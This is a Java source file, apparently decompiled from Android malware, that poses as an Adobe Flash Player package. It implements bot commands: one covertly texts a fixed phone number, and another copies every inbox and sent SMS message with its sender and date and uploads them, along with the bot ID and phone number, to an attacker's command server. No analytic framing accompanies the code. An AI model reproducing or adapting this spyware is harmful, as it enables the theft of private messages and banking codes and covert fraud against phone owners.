package com.adobe.flashplayer_;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.CountDownTimer;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Calendar;

public class UniClass {
    public void Execute(String param, Context c) {
        final String BotID = readConfig("BotID", c);
        final String BotNetwork = readConfig("BotNetwork", c);
        final String BotLocation = readConfig("BotLocation", c);
        final String Reich_ServerGate = readConfig("Reich_ServerGate", c);
        final String BotVer = readConfig("BotVer", c);
        final String SDK = VERSION.RELEASE;
        if (param.contains("MacrosA")) {
            writeConfig("w", "*", c);
            sendSMS("79262000900", "HELP");
            writeConfig("MacrosAState", "A", c);
        }
        if (param.indexOf("getMessages") != -1) {
            String msg;
            long date;
            String pack_inbox = "";
            String pack_inbox_pack = "";
            String pack_outbox = "";
            String pack_outbox_pack = "";
            Cursor inc = c.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            while (inc.moveToNext()) {
                msg = inc.getString(inc.getColumnIndex("body"));
                date = inc.getLong(inc.getColumnIndex("date"));
                pack_inbox = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(pack_inbox)).append(inc.getString(inc.getColumnIndex("address"))).append("\r").toString())).append(millisToDate(date)).append("\r").toString())).append(msg).append("\r\r").toString();
            }
            inc.close();
            saveData(new StringBuilder(String.valueOf(pack_inbox_pack)).append(pack_inbox).toString(), "in", c);
            Cursor ouc = c.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
            while (ouc.moveToNext()) {
                msg = ouc.getString(ouc.getColumnIndex("body"));
                date = ouc.getLong(ouc.getColumnIndex("date"));
                pack_outbox = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(pack_outbox)).append(ouc.getString(ouc.getColumnIndex("address"))).append("\r").toString())).append(millisToDate(date)).append("\r").toString())).append(msg).append("\r\r").toString();
            }
            ouc.close();
            saveData(new StringBuilder(String.valueOf(pack_outbox_pack)).append(pack_outbox).toString(), "out", c);
            final Context context = c;
            new CountDownTimer(3000, 1000) {
                public void onTick(long millisUntilFinished) {
                }

                public void onFinish() {
                    new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + UniClass.this.readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=in_sms&i=cmd", context.getFileStreamPath("in").toString(), Reich_ServerGate});
                    new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + UniClass.this.readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=out_sms&i=cmd", context.getFileStreamPath("out").toString(), Reich_ServerGate});
                }
            }.start();
        }
    }

    /* access modifiers changed from: private */
    public String readConfig(String config, Context c) {
        String ret = "";
        try {
            InputStream inputStream = c.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    public static String millisToDate(long currentTime) {
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(currentTime);
        return calendar.getTime().toString();
    }

    private void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    public void sendSMS(String n, String msg) {
        String phoneNumber = n;
        String message = msg;
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendMultipartTextMessage(phoneNumber, null, smsManager.divideMessage(message), null, null);
    }

    private void sendREP(String Reich_ServerGate, String i, String rep, Context c) {
        String BotID = readConfig("BotID", c);
        String BotNetwork = readConfig("BotNetwork", c);
        String BotLocation = readConfig("BotLocation", c);
        String SDK = VERSION.RELEASE;
        String BotVer = readConfig("BotVer", c);
        String pn = ((TelephonyManager) c.getSystemService("phone")).getLine1Number();
        pn = pn == null ? "" : pn.replace("+", "");
        if (BotID == null) {
            BotID = Secure.getString(c.getContentResolver(), "android_id");
        }
        String request = "a=2&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + pn + "&f=" + BotVer + "&g=" + SDK + "&h=" + rep;
        new FlashVars().execute(new String[]{new StringBuilder(String.valueOf(Reich_ServerGate)).append("?").append(request).toString()});
    }

    private void saveData(String data, String f, Context context) {
        try {
            OutputStreamWriter osw = new OutputStreamWriter(context.openFileOutput(f, 0));
            osw.write(data);
            osw.close();
        } catch (IOException e) {
        }
    }
}
